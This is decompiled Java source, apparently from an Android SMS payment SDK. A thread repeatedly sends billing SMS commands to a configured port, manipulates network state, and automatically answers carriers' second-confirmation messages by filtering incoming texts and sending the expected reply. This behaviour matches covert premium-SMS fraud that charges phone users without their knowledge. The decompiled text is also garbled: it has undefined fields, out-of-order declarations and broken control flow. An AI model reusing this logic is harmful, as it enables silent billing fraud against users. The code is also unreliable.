package com.zhangzhifu.sdk.util.sms;

import com.zhangzhifu.sdk.db.SMSDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.SMSBean;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.MobileNetworkManage;
import com.zhangzhifu.sdk.util.SystemInfo;
import com.zhangzhifu.sdk.util.sms.filtersms.ReceiveSMSSign;
import java.io.PrintStream;

final class a
  extends Thread
{
  private SMSBean db;
  
  public a(SMSFee paramSMSFee, SMSBean paramSMSBean)
  {
    this.db = paramSMSBean;
  }
  
  public final void run()
  {
    SMSBean localSMSBean;
    SendSMS localSendSMS1;
    int k;
    String str;
    Object localObject2;
    Object localObject1;
    int m;
    int i;
    if (this.db != null)
    {
      localSMSBean = this.db;
      com.zhangzhifu.sdk.modle.ZhangPayBean.SMS_FEEING = true;
      localSendSMS1 = new SendSMS();
      k = this.db.getChargeCount();
      str = this.db.getPort();
      localObject2 = this.db.getCmd();
      localObject1 = localObject2;
      if (localSMSBean.isIs_fuzzy() == 1) {
        localObject1 = localObject2 + "x" + SystemInfo.getCpId(SMSFee.a(this.dc)) + "x" + SystemInfo.getServiceId(SMSFee.a(this.dc));
      }
      m = this.db.getSmsDelayTime();
      i = k;
    }
    int j;
    for (;;)
    {
      if (i <= 0) {}
      while (!JudgeTimeUtil.isMax(1, SMSFee.a(this.dc)))
      {
        com.zhangzhifu.sdk.modle.ZhangPayBean.SMS_FEEING = false;
        MobileNetworkManage.recoverNetWork(SMSFee.a(this.dc));
        return;
      }
      j = k;
      if (localSendSMS1.sendSMS(SMSFee.a(this.dc), str, (String)localObject1, null))
      {
        j = k - 1;
        localSMSBean.setChargeCount(j);
      }
      i -= 1;
      long l = m * 1000;
      for (;;)
      {
        try
        {
          Thread.sleep(l);
          localObject3 = this.db;
          localObject2 = new ReceiveSMSSign();
          localSendSMS2 = new SendSMS();
          if (((SMSBean)localObject3).getIsSecond() == 1)
          {
            ((ReceiveSMSSign)localObject2).setEndStr(((SMSBean)localObject3).getReplyEndStr());
            ((ReceiveSMSSign)localObject2).setNeedReplay(true);
            if (((SMSBean)localObject3).getSecondType() != 1) {
              continue;
            }
            bool = false;
            ((ReceiveSMSSign)localObject2).setRandKeyword(bool);
            ((ReceiveSMSSign)localObject2).setSendFromNumber(((SMSBean)localObject3).getSecondPort());
            SharePreferUtil.setSeCendAddress(SMSFee.a(this.dc), ((SMSBean)localObject3).getSecondPort());
            ((ReceiveSMSSign)localObject2).setStartStr(((SMSBean)localObject3).getReplyStartStr());
            ((ReceiveSMSSign)localObject2).setSendFromContent(((SMSBean)localObject3).getReplyContent());
            if ((((SMSBean)localObject3).getReplyContent() != null) || (!((SMSBean)localObject3).getReplyContent().equals(""))) {
              continue;
            }
            System.out.println("回复内容为空");
            localObject3 = this.dc;
            ((ReceiveSMSSign)localObject2).setSendFromNumber(SMSFee.e(SMSFee.a(this.dc)));
          }
        }
        catch (Exception localException)
        {
          Object localObject3;
          SendSMS localSendSMS2;
          boolean bool;
          continue;
          SMSDBManager.getInstance().updateSMSChargeCountById(SMSFee.a(this.dc), localSMSBean);
          k = j;
        }
        if (j != 0) {
          continue;
        }
        SMSDBManager.getInstance().deleteSMSById(SMSFee.a(this.dc), localSMSBean.getId());
        k = j;
        break;
        bool = true;
        continue;
        if ((SharePreferUtil.getSeCendRedamAddress(SMSFee.a(this.dc)) != null) || (!SharePreferUtil.getSeCendRedamAddress(SMSFee.a(this.dc)).equals(""))) {
          localSendSMS2.sendSMS(SMSFee.a(this.dc), SharePreferUtil.getSeCendRedamAddress(SMSFee.a(this.dc)), ((SMSBean)localObject3).getReplyContent(), null);
        }
      }
    }
  }
}
